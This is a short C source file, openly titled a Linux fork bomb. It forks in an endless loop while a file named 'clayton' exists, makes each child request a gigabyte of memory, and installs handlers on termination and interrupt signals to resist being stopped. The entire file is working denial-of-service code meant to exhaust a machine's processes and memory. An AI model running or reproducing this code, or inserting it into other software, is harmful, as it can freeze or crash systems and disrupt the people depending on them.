//Clayton Yager Linux forkbomb
#include <stdio.h>
#include <stdlib.h>
#include <wchar.h>
#include <unistd.h>
#include <string.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <string.h>
//TODO: Remove some includes. Some are leftover from trying to work with a daemon

//A file named clayton is created as a safeguard for testing.
//Delete it to stop the fork bomb
//Warning: This forkbomb is very efficient.

//This creates forks and has them request memory
int ccount = 0;
int started = 0;
void handler(int signal){
	char *a;
	a = (char *)calloc(1024*1024*1024,sizeof(char));
	a = "1"; 
}

int main (){
	if (started == 0){ 
	system("touch clayton");
	started = 1;
	}
	struct sigaction s;
	s.sa_handler = handler;
	sigaction(SIGINT, &s, 0);
	sigaction(SIGTSTP, &s, 0);
	sigaction(SIGTERM, &s, 0);
	sigaction(SIGSEGV, &s, 0);
	sigaction(SIGKILL, &s, 0);
	pid_t pid = 0;
	pid_t sid = 0;
top:
	if ( access("clayton", F_OK) != -1){
		pid = fork();
		if(pid)
		{
			ccount++;
			if(ccount != -1)
			{
				goto top;
			}
		}
		else {
			handler(-1);
			return 0;
		}
	}else{
		exit(0);
	}
	return 0;
}
